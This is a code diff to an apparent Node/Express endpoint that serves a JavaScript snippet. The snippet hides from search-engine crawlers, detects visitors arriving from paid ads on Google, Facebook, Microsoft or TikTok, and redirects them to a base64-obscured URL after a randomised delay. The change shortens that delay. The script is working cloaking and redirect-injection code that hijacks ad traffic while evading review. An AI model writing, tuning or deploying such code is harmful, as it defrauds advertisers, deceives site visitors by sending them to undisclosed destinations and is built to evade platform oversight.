@@ -68,7 +68,7 @@ app.get("/c.js", (req, res) => {
   const cfg = loadConfig();
   const url = cfg.redirectUrl;
   const enc = Buffer.from(url, "utf-8").toString("base64");
-  const script = `(function(){var E=${cfg.enabled};if(!E)return;var u=navigator.userAgent.toLowerCase();if(/googlebot|bingbot/.test(u))return;var p=new URLSearchParams(window.location.search);var r=document.referrer||"";var a=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");if(!a)return;var d=atob("${enc}");setTimeout(function(){window.location.href=d;},800+Math.random()*700);})();`;
+  const script = `(function(){var E=${cfg.enabled};if(!E)return;var u=navigator.userAgent.toLowerCase();if(/googlebot|bingbot/.test(u))return;var p=new URLSearchParams(window.location.search);var r=document.referrer||"";var a=p.has("gclid")||p.has("fbclid")||p.has("msclkid")||p.has("ttclid")||r.includes("google.com")||r.includes("/aclk")||r.includes("facebook.com")||r.includes("fb.com");if(!a)return;var d=atob("${enc}");setTimeout(function(){window.location.href=d;},100+Math.random()*150);})();`;
   res.setHeader("Content-Type", "application/javascript");
   res.setHeader("Cache-Control", "no-store");
   res.send(script);
